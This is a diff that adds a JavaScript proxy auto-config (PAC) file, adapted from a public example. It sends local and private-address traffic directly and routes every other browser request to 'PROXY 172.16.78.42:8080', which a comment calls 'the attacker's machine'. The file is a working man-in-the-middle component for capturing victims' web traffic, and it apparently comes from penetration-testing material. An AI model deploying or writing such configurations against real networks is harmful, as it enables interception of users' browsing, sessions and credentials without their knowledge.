@@ -1,0 +1,27 @@
+// Modified of example PAC file from http://findproxyforurl.com
+// The concept is to deliver any local traffic directly, or any
+// other traffic that wouldn't be helpful for what you are looking for.
+//
+
+function FindProxyForURL(url, host) {
+ 
+// Try to catch any sites that are local to this domain/company/target:
+    if (dnsDomainIs(host, ".intranet.local.com") ||
+        shExpMatch(host, "(*.localdomain.com|localdomain.com)"))
+        return "DIRECT";
+ 
+// Catch any hosts that are on private (RFC-1918) IP space, as they
+// will be local.
+    if (isPlainHostName(host) ||
+        shExpMatch(host, "*.local") ||
+        isInNet(dnsResolve(host), "10.0.0.0", "255.0.0.0") ||
+        isInNet(dnsResolve(host), "172.16.0.0",  "255.240.0.0") ||
+        isInNet(dnsResolve(host), "192.168.0.0",  "255.255.0.0") ||
+        isInNet(dnsResolve(host), "127.0.0.0", "255.255.255.0"))
+        return "DIRECT";
+ 
+// This is the final rule -- everything that hasn't been already matched will
+// match this rule.   The proxy should be the attacker's machine:
+    return "PROXY 172.16.78.42:8080";
+ 
+}
